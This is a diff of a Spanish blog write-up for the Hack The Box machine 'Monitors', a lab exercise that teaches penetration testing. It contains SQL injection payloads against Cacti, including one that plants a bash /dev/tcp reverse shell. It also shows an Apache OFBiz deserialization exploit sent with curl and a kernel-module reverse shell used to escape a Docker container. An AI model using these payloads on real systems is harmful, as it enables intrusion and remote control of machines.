@@ -7,7 +7,7 @@ lang: es
 
 ![Info Card](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}
 
-El día de hoy vamos a estar resolviendo la máquina _Monitors_ de _Hack The Box_.
+El día de hoy vamos a estar resolviendo la máquina _Monitors_ de _Hack The Box_. Es una máquina _Linux_ de nivel de dificultad difícil según figura en la plataforma. Pese a su dificultad, no hay que sentirse intimidados, ya que cubre diversas técnicas y vulnerabilidades, lo que la convierte en una excelente oportunidad para aprender y practicar, todo detallado paso a paso.
 
 ### [](#header-3)Fase De Reconocimiento
 
@@ -89,11 +89,11 @@ El escaneo nos devuelve un código de estado `403 Forbidden`, lo que indica que 
 
 ![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}
 
-Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es `monitors.htb`. Esto es una pista importante, ya que un dominio en el correo electrónico sugiere que el servidor está configurado con `virtual hosting`; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados. 
+Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es `monitors.htb`. Este detalle es relevante ya que el dominio en la dirección de correo electrónico puede ser una pista sobre el uso de `virtual hosting`; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados.
 
 ![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}
 
-Para verificarlo, editamos el archivo `/etc/hosts` para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.
+Para verificarlo, editaremos el archivo `/etc/hosts` para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.
 
 ![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -139,7 +139,7 @@ Al descargar su archivo `readme.txt` y revisarlo, confirmamos que se está utili
 
 ![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}
 
-Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en _Exploit Database_ —por ejemplo—, o directamente desde la consola usando `searchsploit`.
+Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer directamente desde la consola usando `searchsploit`, o buscando en línea en _Exploit Database_.
 
 ```
 searchsploit spritz
@@ -147,7 +147,7 @@ searchsploit spritz
 
 ![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}
 
-Encontramos un exploit para este plugin en esta versión que explota una vulnerabilidad `Remote File Inclusion` (RFI).
+Encontramos un exploit para esta versión que explota una vulnerabilidad `Remote File Inclusion` (RFI).
 
 ![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -165,7 +165,7 @@ http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.p
 
 ![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}
 
-Sin embargo, si intentamos cargar una _reverse shell_, esta no se ejecutará debido a que el `RFI` utiliza la función `file_get_contents`, que simplemente lee el contenido de un archivo o URL como texto sin interpretar o ejecutar ningún código _PHP_ que contenga.
+Sin embargo, si intentamos cargar una _reverse shell_, esta no se ejecutará debido a que el `RFI` utiliza la función `file_get_contents`, que simplemente lee el contenido del archivo como texto, sin interpretar o ejecutar ningún código _PHP_ que contenga.
 
 ![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -255,16 +255,17 @@ Esta búsqueda revela una vulnerabilidad de [inyección SQL](https://mateonitro5
 
 ![33](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"}
 
-Para acceder, en la interfaz de `Cacti`, vamos al menú izquierdo, en la sección _Presets_, donde se encuentra la opción _Color_. Aquí se despliega una tabla con diversas configuraciones de colores. La vulnerabilidad se explota usando el parámetro `filter`, al que podemos inyectar comandos SQL para manipular las consultas a la base de datos en la URL que aparece a continuación:
+En la interfaz de `Cacti`, la vulnerabilidad se localiza en el parámetro `filter` de la siguiente URL:
 
 ```
 http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1
 ```
 
+Este parámetro se encuentra en la sección _Presets_ del menú izquierdo, bajo la opción _Color_, que despliega una tabla con una lista de colores y sus propiedades. Manipulando este parámetro, podemos inyectar comandos SQL y alterar las consultas a la base de datos.
+
 ![34](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"}
 
-Comenzaremos inyectando el payload clásico `')+UNION+SELECT+NULL;--+-` para calcular el número de columnas en la consulta. 
-
+Comenzaremos inyectando el _payload_ clásico `')+UNION+SELECT+NULL;--+-` para calcular el número de columnas en la consulta. 
 
 ```
 http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL;--+-
@@ -280,7 +281,7 @@ http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+S
 
 ![36](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png){:class="blog-image" onclick="expandImage(this)"}
 
-Ahora queremos listar todas las tablas en la base de datos, utilizando el payload que aparece a continuación:
+Ahora nos interesa listar todas las tablas de la base de datos; para ello, utilizaremos el siguiente _payload_:
 
 ```
 http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
@@ -312,10 +313,53 @@ Sin embargo, existe una segunda inyección que nos permite obtener una _reverse 
 http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UPDATE+settings+SET+value='bash -i >& /dev/tcp/<nuestraIP>/443 0>&1;'+WHERE+name='path_php_binary';--+-
 ```
 
-Con esto, modificamos un valor dentro de la configuración de `Cacti` para que ejecute nuestro comando de _reverse shell_. Para activarlo, accedemos a la URL que aparece a continuación:
+Al modificar el parámetro `path_php_binary` en la tabla _settings_ para que apunte a una _reverse shell_ en lugar del ejecutable de PHP, conseguimos que el sistema ejecute nuestro comando. Esto sucede porque `Cacti` utiliza el valor de este parámetro en la función `host_reindex()`, ubicada en el archivo [host.php]( https://github.com/Cacti/cacti/blob/develop/host.php). La lógica detrás de esto es la siguiente:
+
+```php
+switch (get_request_var('action')) {
+	case 'reindex':
+		host_reindex();
+
+		header('Location: host.php?action=edit&id=' . get_request_var('host_id'));
+
+		break;
+}
+```
+
+Cuando el parámetro _action_ es igual a `reindex`, se ejecuta la función `host_reindex()`, la cual utiliza la función _shell_exec()_ para ejecutar el comando definido en `path_php_binary`. Esto permite que nuestra _reverse shell_ se ejecute en lugar del script PHP legítimo. El código de la función `host_reindex()` es el siguiente:
+
+```php
+function host_reindex() {    
+    global $config;
+
+	$start = microtime(true);
+
+	shell_exec(read_config_option('path_php_binary') . ' -q ' . CACTI_PATH_CLI . '/poller_reindex_hosts.php --qid=all --id=' . get_filter_request_var('host_id'));
+
+	$end = microtime(true);
+
+	$total_time = $end - $start;
+
+	$items = db_fetch_cell_prepared('SELECT COUNT(*)
+		FROM host_snmp_cache
+		WHERE host_id = ?',
+		array(get_filter_request_var('host_id'))
+	);
+
+	raise_message('host_reindex', __('Device Reindex Completed in %0.2f seconds.  There were %d items updated.', $total_time, $items), MESSAGE_LEVEL_INFO);
+}
+```
+
+Una vez hemos modificamos el parámetro `path_php_binary`, pondremos nuestra máquina en escucha a través de `Netcat` para recibir la reverse shell:
 
 ```
-http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
+nc -nlvp 443
+```
+
+Podemos dirigirnos a [http://cacti-admin.monitors.htb/cacti/host.php?action=reindex](http://cacti-admin.monitors.htb/cacti/host.php?action=reindex) o, desde la propia consola, ejecutarla con:
+
+```
+curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 ```
 
 Al hacerlo, logramos establecer la _reverse shell_, obteniendo acceso directo dentro de la máquina.
@@ -390,7 +434,7 @@ Una vez dentro como el usuario `marcus`, podemos leer la nota que habíamos enco
 
 ![48](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/48.png){:class="blog-image" onclick="expandImage(this)"}
 
-Después de explorar un poco más la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con _Nmap_. Estos puertos, conocidos como _puertos internos_, están disponibles solo localmente. Los puertos `8443` (HTTPS), `3306` (MySQL) y `53` (DNS) están escuchando en `127.0.0.1` y no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con _Nmap_ y están disponibles para conexiones externas.
+Después de explorar más a fondo la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con _Nmap_. Estos puertos, conocidos como _puertos internos_, están disponibles solo localmente en la propia máquina. Los puertos `8443` (HTTPS), `3306` (MySQL) y `53` (DNS) están configurados para aceptar conexiones únicamente desde la dirección local (127.0.0.1), por lo que no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con _Nmap_ y están disponibles para conexiones externas.
 
 ```
 netstat -nlpt
@@ -410,7 +454,7 @@ Este comando establece un _túnel SSH_, redirigiendo el puerto `8443` en nuestra
 
 ![50](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/50.png){:class="blog-image" onclick="expandImage(this)"}
 
-Con el _túnel SSH_ configurado, accedemos al puerto web local `8443` y comenzamos a explorar la aplicación. Al realizar un _fuzzing_, descubrimos varias rutas interesantes.
+Con el _túnel SSH_ configurado, logramos conectar al puerto web local `8443` y comenzamos a explorar la aplicación. Dado que no tenemos información clara sobre su estructura o el tipo de servicio que está corriendo, podemos aplicar _fuzzing_ para descubrir rutas y directorios potenciales.
 
 ```
 wfuzz -c -L -t 400 --hc 404 --hh 800 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://localhost:8443/FUZZ
@@ -422,11 +466,11 @@ Entre ellas, la ruta `main` nos indica que podemos iniciar sesión usando el nom
 
 ![52](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/52.png){:class="blog-image" onclick="expandImage(this)"}
 
-Sin embargo, las rutas `bi` y `example` nos dirigen a un panel de autenticación en un sistema `Apache OFBiz`, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. En este panel también se muestra la versión de `Apache OFBiz`, la cual es `17.12.01`.
+Por otra parte, las rutas `bi` y `example` nos dirigen a un panel de autenticación en un sistema `Apache OFBiz`, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. No obstante, lo más relevante aquí es que este panel nos proporciona la versión de `Apache OFBiz` que se está empleando: `17.12.01`.
 
 ![53](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png){:class="blog-image" onclick="expandImage(this)"}
 
-Como lo hemos venido haciendo, podemos proceder a investigar si esta versión de `Apache OFBiz` presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en _Exploit Database_, o directamente desde la consola con `searchsploit`:
+Como lo hemos venido haciendo, procederemos a investigar si esta versión de `Apache OFBiz` presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en _Exploit Database_, o directamente desde la consola con `searchsploit`:
 
 ```
 searchsploit ofbiz 17.12.01
@@ -438,9 +482,9 @@ Entre los resultados, encontramos un exploit que proporciona _ejecución remota 
 
 ![55](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png){:class="blog-image" onclick="expandImage(this)"}
 
-Primero, descargaremos [ysoserial](https://github.com/frohoff/ysoserial), una herramienta que nos permite generar objetos _Java_ serializados con payloads maliciosos. Esto resulta útil en `ataques de deserialización`, donde al enviar un _objeto serializado_ especialmente diseñado, logramos ejecutar código en el servidor si este procesa (_deserializa_) el objeto sin realizar una validación adecuada.
+Primero, descargaremos [ysoserial](https://github.com/frohoff/ysoserial), una herramienta que nos permite generar objetos _Java_ serializados con _payloads_ maliciosos. Esto resulta útil en `ataques de deserialización`, donde al enviar un _objeto serializado_ especialmente diseñado, logramos ejecutar código en el servidor si este procesa (_deserializa_) el objeto sin realizar una validación adecuada.
 
-Luego, definimos una _reverse shell_ con un script _Bash_. La _reverse shell_ nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado `shell.sh` con el siguiente contenido:
+Posteriormente, escribiremos una _reverse shell_ en _Bash_. Esta _reverse shell_ nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado `shell.sh` con el siguiente contenido:
 
 ```bash
 #!/bin/bash
@@ -486,7 +530,7 @@ Antes de enviar este segundo _payload_, pondremos nuestra máquina en escucha co
 ```
 nc -nlvp 443
 ```
-Finalmente, enviamos el segundo payload utilizando `curl` de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo `shell.sh` y obtendremos una _reverse shell_ dentro de la máquina víctima.
+Finalmente, enviamos el segundo _payload_ utilizando `curl` de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo `shell.sh` y obtendremos una _reverse shell_ dentro de la máquina víctima.
 
 ```
 curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'> PAYLOAD </serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
@@ -502,9 +546,9 @@ Sin embargo, en lugar de estar directamente en la máquina víctima, nos encontr
 
 ![60](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/60.png){:class="blog-image" onclick="expandImage(this)"}
 
-Dado que somos `root`, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un `docker breakout` para conseguir acceso a la máquina anfitriona y preservar nuestro estado como `root` en el sistema de la víctima.
+Dado que somos `root`, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un `docker breakout` para conseguir acceso a la máquina anfitriona preservando nuestro estado como `root`.
 
-Por defecto, `Docker` asigna ciertas `capabilities` a los contenedores. Aunque el conjunto de _capabilities_ asignado es mínimo para dificultar la explotación, existen ciertas _capabilities_ que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las _capabilities_ existente con el comando:
+Por defecto, `Docker` asigna ciertas `capabilities` a los contenedores. Aunque el conjunto de _capabilities_ asignado es mínimo para dificultar la explotación, existen ciertas _capabilities_ que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las _capabilities_ existentes con el comando:
 
 ```
 capsh --print
@@ -514,11 +558,11 @@ capsh --print
 
 Entre las _capabilities_ encontradas en el contenedor, identificamos `CAP_DAC_OVERRIDE` y `CAP_SYS_MODULE`, ambas que podríamos intentar abusar. Con `CAP_DAC_OVERRIDE`, podríamos escribir en el sistema de archivos de la máquina anfitriona. Sin embargo, para poder hacerlo, también debe estar presente la capability `CAP_DAC_READ_SEARCH`, lo que no ocurre en este caso, por lo que esta vía de explotación no es posible. En cambio, podemos abusar de `CAP_SYS_MODULE`.
 
-Esta capability permite a los procesos cargar y descargar _módulos del kernel_, lo que significa que podemos inyectar código directamente en el _kernel_ del sistema anfitrión. Al permitir la ejecución de las llamadas al sistema, esta capability proporciona acceso directo al núcleo del sistema operativo. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el _kernel_ con el anfitrión, este tipo de inyección nos permite interactuar con el _kernel_ de la máquina anfitriona a través del contenedor. Esto nos brinda la capacidad de comprometer totalmente el sistema al permitirnos alterar el _kernel_ y, por lo tanto, eludir todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.
+Esta _capability_ permite a los procesos cargar y descargar _módulos de kernel_, lo que nos permite inyectar código directamente en el _kernel_ del sistema. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el _kernel_ con sistema el anfitrión, esta _capability_ nos permite interactuar con _él_ a través del contenedor. Esto nos permite comprometer completamente el sistema, alterando el _kernel_ y eludiendo todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.
 
 Para aprovechar la capability `CAP_SYS_MODULE` y escapar del contenedor, vamos a escribir un módulo de _kernel_ que abrirá una _reverse shell_ hacia nuestra máquina de atacante. Este módulo será compilado mediante un _Makefile_, y luego se inyectará en el _kernel_ del sistema anfitrión para ejecutar el código.
 
-El archivo `reverse-shell.c` contiene el código del módulo de _kernel_:
+Escribiremos un archivo `reverse-shell.c` que condentrá el código del módulo de _kernel_:
 
 ```c
 #include <linux/kmod.h>
@@ -539,11 +583,11 @@ module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
 
-Este código define un módulo de _kernel_ que utiliza la función `call_usermodehelper` para ejecutar el comando de _reverse shell_ en el sistema anfitrión. Al inicializar el módulo (reverse_shell_init), se ejecuta el comando que abrirá una conexión de _reverse shell_ hacia nuestra IP en el puerto `4444`.
+Este código define un módulo de _kernel_ que utiliza la función `call_usermodehelper` para ejecutar el comando que abrirá una _reverse shell_ en el sistema anfitrión. Al inicializar el módulo a través de `reverse_shell_init`, se ejecuta el comando que establecerá una conexión hacia nuestra IP en el puerto `4444`.
 
 ![62](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/62.png){:class="blog-image" onclick="expandImage(this)"}
 
-Por otro lado, el Makefile automatiza el proceso de compilación del módulo:
+Por otro lado, definiremos un archivo Makefile que automatiza el proceso de compilación del módulo:
 
 ```make
 obj-m +=reverse-shell.o
@@ -555,7 +599,7 @@ clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 
-Este _Makefile_ crea el archivo binario del módulo (`reverse-shell.ko`) usando el código fuente `reverse-shell.c`. La línea `make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules` le indica al compilador que use la versión del _kernel_ activa en el sistema anfitrión para crear el módulo. El comando `make clean` elimina cualquier archivo generado en la compilación, manteniendo el entorno limpio.
+Este _Makefile_ se encarga de crear el archivo binario del módulo (`reverse-shell.ko`) usando el código fuente `reverse-shell.c`. La línea `make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules` le indica al compilador que utilice la versión activa del _kernel_ en el sistema anfitrión para crear el módulo. Por su parte, el comando `make clean` elimina cualquier archivo generado durante la compilación, manteniendo el entorno limpio.
 
 ![63](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/63.png){:class="blog-image" onclick="expandImage(this)"}
 
